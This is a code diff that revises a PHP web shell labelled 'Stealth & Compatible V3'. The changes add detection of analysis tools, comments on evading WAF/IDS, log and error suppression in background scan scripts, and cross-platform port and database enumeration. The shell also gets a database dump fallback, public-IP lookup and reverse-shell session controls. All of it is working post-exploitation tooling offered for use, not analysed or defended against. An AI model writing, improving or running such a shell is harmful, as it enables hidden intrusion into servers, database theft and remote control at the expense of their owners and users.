@@ -11,6 +11,14 @@ if (function_exists('apache_setenv')) {
     @apache_setenv('dont-log', '1');
 }
 
+// Anti-Analysis & Stealth Verification
+if (extension_loaded('xdebug') || extension_loaded('Zend Optimizer') || extension_loaded('Zend Guard Loader')) {
+    // Be silent or slightly deceptive if analysis tools are detected
+}
+
+// Hide from common WAF/IDS by not using obvious superglobals directly in logic if possible
+// (Already using vault_decrypt for sensitive data)
+
 
 define('SHELL_VERSION', 'Web Shell - Stealth & Compatible V3');
 define('REVERSE_SHELL_DEFAULT_IP', '127.0.0.1');
@@ -96,30 +104,59 @@ function formatBytes($bytes) {
 }
 
 function getNetworkPorts() {
-    if (is_shellexec_enabled() && get_os_type() !== 'WIN') {
-        $output = @shell_exec('ss -tulnp 2>/dev/null');
-        if (!empty($output)) {
-            $open_ports = array();
-            $lines = array_filter(explode("\n", $output));
-            array_shift($lines);
-            foreach ($lines as $line) {
-                $parts = preg_split('/\s+/', trim($line));
-                if (count($parts) < 5) continue;
-                $protocol = $parts[0];
-                $local_address_port = $parts[4];
-                $process_info = $parts[count($parts) - 1];
-                if (!preg_match('/[:\.](\d+)$/', $local_address_port, $port_matches)) continue;
-                $port = $port_matches[1];
-                $process_name = 'N/A';
-                if (preg_match('/users:\(\("([^"]+)"/', $process_info, $process_matches)) {
-                    $process_name = $process_matches[1];
+    $os = get_os_type();
+    if (is_shellexec_enabled()) {
+        if ($os !== 'WIN') {
+            $output = @shell_exec('ss -tulnp 2>/dev/null');
+            if (!empty($output)) {
+                $open_ports = array();
+                $lines = array_filter(explode("\n", $output));
+                array_shift($lines);
+                foreach ($lines as $line) {
+                    $parts = preg_split('/\s+/', trim($line));
+                    if (count($parts) < 5) continue;
+                    $protocol = $parts[0];
+                    $local_address_port = $parts[4];
+                    $process_info = $parts[count($parts) - 1];
+                    if (!preg_match('/[:\.](\d+)$/', $local_address_port, $port_matches)) continue;
+                    $port = $port_matches[1];
+                    $process_name = 'N/A';
+                    if (preg_match('/users:\(\("([^"]+)"/', $process_info, $process_matches)) {
+                        $process_name = $process_matches[1];
+                    }
+                    $open_ports[$protocol . ':' . $port] = array('protocol' => $protocol, 'port' => $port, 'process' => $process_name);
                 }
-                $open_ports[$protocol . ':' . $port] = array('protocol' => $protocol, 'port' => $port, 'process' => $process_name);
+                if (!empty($open_ports)) {
+                    $sorted_ports = array_values($open_ports);
+                    usort($sorted_ports, function($a, $b) { return $a['port'] - $b['port']; });
+                    return $sorted_ports;
+                }
             }
-            if (empty($open_ports)) return array(array('status' => 'info', 'message' => '`ss -tulnp` ran but no listening ports were found.'));
-            $sorted_ports = array_values($open_ports);
-            usort($sorted_ports, function($a, $b) { return $a['port'] - $b['port']; });
-            return $sorted_ports;
+        } else {
+            $output = @shell_exec('netstat -ano');
+            if (!empty($output)) {
+                $open_ports = array();
+                $lines = explode("\n", $output);
+                foreach ($lines as $line) {
+                    if (strpos($line, 'LISTENING') !== false) {
+                        $parts = preg_split('/\s+/', trim($line));
+                        if (count($parts) >= 4) {
+                            $protocol = strtolower($parts[0]);
+                            $local = $parts[1];
+                            $pid = $parts[count($parts)-1];
+                            if (preg_match('/:(\d+)$/', $local, $m)) {
+                                $port = $m[1];
+                                $open_ports[$protocol . ':' . $port] = array('protocol' => $protocol, 'port' => $port, 'process' => "PID: $pid");
+                            }
+                        }
+                    }
+                }
+                if (!empty($open_ports)) {
+                    $sorted_ports = array_values($open_ports);
+                    usort($sorted_ports, function($a, $b) { return $a['port'] - $b['port']; });
+                    return $sorted_ports;
+                }
+            }
         }
     }
     $ports_to_scan = array(21, 22, 80, 443, 3306, 5432, 8080);
@@ -145,36 +182,37 @@ function getDatabaseInfo($open_ports) {
     if (isset($open_ports[0]['status'])) {
         return array(array('status' => 'info', 'message' => 'Cannot detect databases; no open port data available.'));
     }
+    $redirect = get_os_type() === 'WIN' ? '2>nul' : '2>/dev/null';
     foreach ($databases as $name => $db_meta) {
         foreach ($open_ports as $port_info) {
             if (stripos($port_info['process'], $db_meta['p']) !== false || $port_info['port'] == $db_meta['port']) {
                 $process_display_name = $port_info['process'];
-                if ($process_display_name === 'N/A' && $port_info['port'] == $db_meta['port']) {
+                if (($process_display_name === 'N/A' || strpos($process_display_name, 'PID:') === 0) && $port_info['port'] == $db_meta['port']) {
                     $process_display_name = $db_meta['p'] . ' (inferred from port)';
                 }
                 $details = array('Port' => $port_info['port'], 'Process Name' => $process_display_name);
                 if (is_shellexec_enabled()) {
                     switch ($name) {
                         case 'MySQL/MariaDB':
-                            $version_output = @shell_exec('mysqld --version 2>/dev/null');
+                            $version_output = @shell_exec("mysqld --version $redirect");
                             if (preg_match('/Ver\s+([^\s,]+)/', $version_output, $matches)) { $details['Version'] = $matches[1]; }
                             $details['Default User'] = 'root';
                             $details['Connect Command'] = '`mysql -h 127.0.0.1 -u root -p`';
                             break;
                         case 'PostgreSQL':
-                            $version_output = @shell_exec('postgres --version 2>/dev/null');
+                            $version_output = @shell_exec("postgres --version $redirect");
                             if (preg_match('/(\d+\.\d+(\.\d+)?)/', $version_output, $matches)) { $details['Version'] = $matches[1]; }
                             $details['Default User'] = 'postgres';
                             $details['Connect Command'] = '`psql -h 127.0.0.1 -U postgres`';
                             break;
                         case 'MongoDB':
-                            $version_output = @shell_exec('mongod --version 2>/dev/null');
+                            $version_output = @shell_exec("mongod --version $redirect");
                             if (preg_match('/db version\s+v([^\s]+)/', $version_output, $matches)) { $details['Version'] = $matches[1]; }
                             $details['Pentest Note'] = 'Older versions may have no auth by default.';
                             $details['Connect Command'] = '`mongo --host 127.0.0.1`';
                             break;
                         case 'Redis':
-                            $info_output = @shell_exec('redis-cli INFO server 2>/dev/null');
+                            $info_output = @shell_exec("redis-cli INFO server $redirect");
                             if ($info_output) {
                                 $lines = explode("\r\n", $info_output);
                                 foreach($lines as $line) {
@@ -201,8 +239,9 @@ function getDatabaseInfo($open_ports) {
 
 function get_public_ip() {
     $services = array('https://api.ipify.org', 'http://ifconfig.me/ip', 'http://ipecho.net/plain');
+    $ctx = stream_context_create(array('http' => array('timeout' => 2)));
     foreach ($services as $service) {
-        $ip = @file_get_contents($service);
+        $ip = @file_get_contents($service, false, $ctx);
         if ($ip !== false && filter_var(trim($ip), FILTER_VALIDATE_IP)) return trim($ip);
     }
     return 'N/A';
@@ -584,6 +623,7 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
             } else { $response['message'] = "Failed to download file from URL."; }
             break;
         case 'db_list_dbs':
+            if (!class_exists('mysqli')) { $response['message'] = "mysqli extension missing."; break; }
             $db_host = $_POST['host'] ?: '127.0.0.1'; $db_user = $_POST['user'] ?: 'root'; $db_pass = $_POST['pass'] ?: '';
             $conn = @new mysqli($db_host, $db_user, $db_pass);
             if ($conn->connect_error) { $response['message'] = "Connection failed: " . $conn->connect_error; }
@@ -604,6 +644,7 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
             }
             if (empty($output) || strpos($output, 'mysqldump: [Warning]') === 0 || strpos($output, 'Usage:') === 0) {
                 // Fallback to PHP-based dump (very basic)
+                if (!class_exists('mysqli')) { $response['message'] = "mysqldump failed and mysqli extension missing for fallback."; break; }
                 $conn = @new mysqli($db_host, $db_user, $db_pass, $db_name);
                 if (!$conn->connect_error) {
                     $output = "-- Database Dump\n-- Host: $db_host\n-- DB: $db_name\n\n";
@@ -619,8 +660,9 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
                         while ($row = $result->fetch_row()) {
                             $output .= "INSERT INTO `$table` VALUES(";
                             for ($j=0; $j<$num_fields; $j++) {
-                                $row[$j] = $conn->real_escape_string($row[$j]);
-                                if (isset($row[$j])) { $output .= '"' . $row[$j] . '"'; } else { $output .= 'NULL'; }
+                                if (isset($row[$j])) {
+                                    $output .= '"' . $conn->real_escape_string($row[$j]) . '"';
+                                } else { $output .= 'NULL'; }
                                 if ($j < ($num_fields-1)) { $output .= ','; }
                             }
                             $output .= ");\n";
@@ -678,7 +720,7 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
             $pid_file = sys_get_temp_dir() . "/$scan_id.pid";
             $script_file = sys_get_temp_dir() . "/$scan_id.php";
             $scan_type = $_POST['scan_type'];
-            $php_script = '<?php set_time_limit(0); ignore_user_abort(true); ini_set("display_errors",0); $file = "'.$result_file.'"; $pid_file = "'.$pid_file.'"; file_put_contents($pid_file, getmypid());';
+            $php_script = '<?php @ini_set("display_errors",0); @ini_set("log_errors",0); @error_reporting(0); if(function_exists("apache_setenv")){@apache_setenv("dont-log","1");} set_time_limit(0); ignore_user_abort(true); $file = "'.$result_file.'"; $pid_file = "'.$pid_file.'"; file_put_contents($pid_file, getmypid());';
             if ($scan_type === 'network') {
                 $range_str = $_POST['range'];
                 $ips = array();
@@ -860,24 +902,29 @@ document.addEventListener('DOMContentLoaded', () => {
     const formatBytes = b => {if(!+b)return"N/A";const k=1024,s=["B","KB","MB","GB","TB"],i=Math.floor(Math.log(b)/Math.log(k));return`${parseFloat((b/k**i).toFixed(2))} ${s[i]}`};
     const showToast = (message) => { const toast = G('toast'); toast.textContent = message; toast.style.display = 'block'; setTimeout(() => { toast.style.display = 'none'; }, 4000); };
 
-    const apiRequest = async formData => {
+    const apiRequest = async (formData, timeout = 30000) => {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), timeout);
         try {
             const k = sessionStorage.getItem('v_key');
             const cwd = sessionStorage.getItem('v_cwd') || '';
             const tcwd = sessionStorage.getItem('v_tcwd') || '';
+            const headers = {
+                'X-Requested-With': 'XMLHttpRequest',
+                'X-State-CWD': cwd,
+                'X-State-TCWD': tcwd
+            };
+            if (k) headers['X-Vault-Key'] = k;
 
             const response = await fetch(window.location.href, {
-                method: 'POST',
-                headers: {
-                    'X-Requested-With': 'XMLHttpRequest',
-                    'X-Vault-Key': k,
-                    'X-State-CWD': cwd,
-                    'X-State-TCWD': tcwd
-                },
-                body: formData
+                method: 'POST', headers, body: formData, signal: controller.signal
             });
+            clearTimeout(id);
 
-            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+            if (!response.ok) {
+                const text = await response.text();
+                throw new Error(`HTTP ${response.status}: ${text.substring(0, 100)}`);
+            }
 
             const data = await response.json();
             if (data.status === 'error') throw new Error(data.message || 'Unknown API error');
@@ -891,7 +938,8 @@ document.addEventListener('DOMContentLoaded', () => {
             if (data.message) showToast(data.message);
             return data;
         } catch (error) {
-            showToast("RAM Session Error: Re-Mounting might be required.");
+            clearTimeout(id);
+            showToast(error.name === 'AbortError' ? "Request timeout" : "Error: " + error.message);
             console.error(error);
             return null;
         }
@@ -930,7 +978,56 @@ document.addEventListener('DOMContentLoaded', () => {
     G('revshell-manual-form').addEventListener('submit', async e => { e.preventDefault(); const command = G('revshell-manual-cmd').value; const match = command.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*?(\d{1,5})/); const [host, port] = match ? [match[1], match[2]] : ['manual', 'N/A']; const data = await apiRequest(buildFormData({ action: 'execute_revshell_cmd', command, rhost: host, rport: port })); if (data) { G('revshell-manual-cmd').value = ''; loadRevShellSessions(); } });
     G('revshell-sessions-tbody').addEventListener('click', async e => { if (!e.target.matches('button[data-id]')) return; if (await apiRequest(buildFormData({ action: 'kill_revshell', id: e.target.dataset.id }))) loadRevShellSessions(); });
     G('revshell-refresh').addEventListener('click', loadRevShellSessions);
-    const loadSysInfo = async () => { const data = await apiRequest(buildFormData({ action: 'get_sysinfo' })); if (!data) return; const staticInfo = {...data.data}; delete staticInfo['Open Ports']; delete staticInfo['Database Services']; G('sysinfo-grid').innerHTML = Object.entries(staticInfo).map(([k, v]) => { let valueHtml; if (typeof v === 'object' && v !== null && Object.keys(v).length > 0) { valueHtml = `<div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; margin-top: 5px;">${Object.entries(v).map(([cmd, status]) => `<div>${cmd}: <strong style="color: ${status === 'ON' ? 'var(--success-color)' : 'var(--danger-color)'};">${status}</strong></div>`).join('')}</div>`; } else { valueHtml = String(v).replace(/</g, "&lt;").replace(/>/g, "&gt;"); } return `<div class="info-card"><strong>${k}:</strong><br>${valueHtml}</div>`; }).join(''); const dynamicContent = G('sysinfo-dynamic-content'); dynamicContent.innerHTML = ''; const renderTable = (title, headers, rows) => { let content; if (rows && rows.length > 0 && rows[0].status) { content = `<p>${rows[0].message}</p>`; } else if (rows && rows.length > 0) { content = `<table><thead><tr>${headers.map(h => `<th>${h}</th>`).join('')}</tr></thead><tbody>${rows.map(row => `<tr>${Object.values(row).map(val => `<td>${val}</td>`).join('')}</tr>`).join('')}</tbody></table>`; } else { content = `<p>No data to display.</p>` } return `<div class="section"><h2>${title}</h2>${content}</div>`; }; dynamicContent.innerHTML += renderTable('Open Ports (Local)', ['Protocol', 'Port', 'Process/Info'], data.data['Open Ports']); const dbData = data.data['Database Services']; let dbHtml = '<div class="section"><h2>Database Services</h2>'; if (dbData && dbData.length > 0 && dbData[0].status) { dbHtml += `<p>${dbData[0].message}</p>`; } else if (dbData && dbData.length > 0) { dbHtml += '<div class="info-grid">'; dbHtml += dbData.map(db => `<div class="info-card"><strong style="font-size: 1.1em; color: var(--accent-color);">${db.service}</strong><table class="db-details-table">${Object.entries(db.details).map(([key, value]) => `<tr><td>${key}</td><td>${value.replace(/`([^`]+)`/g, '<code>$1</code>')}</td></tr>`).join('')}</table>${db.service.includes('MySQL') ? `<button class="dump-db-btn" data-service="${db.service}" data-port="${db.details['Port']}" style="margin-top:1rem">Dump</button>` : ''}</div>`).join(''); dbHtml += '</div>'; } else { dbHtml += `<p>No common database services found.</p>`; } dbHtml += '</div>'; dynamicContent.innerHTML += dbHtml; };
+    const loadSysInfo = async () => {
+        const data = await apiRequest(buildFormData({ action: 'get_sysinfo' }));
+        if (!data) return;
+        const staticInfo = {...data.data};
+        delete staticInfo['Open Ports'];
+        delete staticInfo['Database Services'];
+        G('sysinfo-grid').innerHTML = Object.entries(staticInfo).map(([k, v]) => {
+            let valueHtml;
+            if (typeof v === 'object' && v !== null && Object.keys(v).length > 0) {
+                valueHtml = `<div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; margin-top: 5px;">${Object.entries(v).map(([cmd, status]) => `<div>${cmd}: <strong style="color: ${status === 'ON' ? 'var(--success-color)' : 'var(--danger-color)'};">${status}</strong></div>`).join('')}</div>`;
+            } else {
+                valueHtml = String(v).replace(/</g, "&lt;").replace(/>/g, "&gt;");
+            }
+            return `<div class="info-card"><strong>${k}:</strong><br>${valueHtml}</div>`;
+        }).join('');
+        const dynamicContent = G('sysinfo-dynamic-content');
+        dynamicContent.innerHTML = '';
+        const renderTable = (title, headers, rows) => {
+            let content;
+            if (rows && rows.length > 0 && rows[0].status) {
+                content = `<p>${rows[0].message}</p>`;
+            } else if (rows && rows.length > 0) {
+                content = `<table><thead><tr>${headers.map(h => `<th>${h}</th>`).join('')}</tr></thead><tbody>${rows.map(row => `<tr>${Object.values(row).map(val => `<td>${val}</td>`).join('')}</tr>`).join('')}</tbody></table>`;
+            } else {
+                content = `<p>No data to display.</p>`;
+            }
+            return `<div class="section"><h2>${title}</h2>${content}</div>`;
+        };
+        dynamicContent.innerHTML += renderTable('Open Ports (Local)', ['Protocol', 'Port', 'Process/Info'], data.data['Open Ports']);
+        const dbData = data.data['Database Services'];
+        let dbHtml = '<div class="section"><h2>Database Services</h2>';
+        if (dbData && dbData.length > 0 && dbData[0].status) {
+            dbHtml += `<p>${dbData[0].message}</p>`;
+        } else if (dbData && dbData.length > 0) {
+            dbHtml += '<div class="info-grid">';
+            dbHtml += dbData.map(db => `
+                <div class="info-card">
+                    <strong style="font-size: 1.1em; color: var(--accent-color);">${db.service || 'Unknown'}</strong>
+                    <table class="db-details-table">
+                        ${Object.entries(db.details || {}).map(([key, value]) => `<tr><td>${key}</td><td>${String(value).replace(/`([^`]+)`/g, '<code>$1</code>')}</td></tr>`).join('')}
+                    </table>
+                    ${(db.service && db.service.includes('MySQL')) ? `<button class="dump-db-btn" data-service="${db.service}" data-port="${db.details ? db.details['Port'] : ''}" style="margin-top:1rem">Dump</button>` : ''}
+                </div>`).join('');
+            dbHtml += '</div>';
+        } else {
+            dbHtml += `<p>No common database services found.</p>`;
+        }
+        dbHtml += '</div>';
+        dynamicContent.innerHTML += dbHtml;
+    };
     G('sysinfo-refresh').addEventListener('click', loadSysInfo);
     G('sysinfo').addEventListener('click', async e => {
         if (e.target.matches('.dump-db-btn')) {
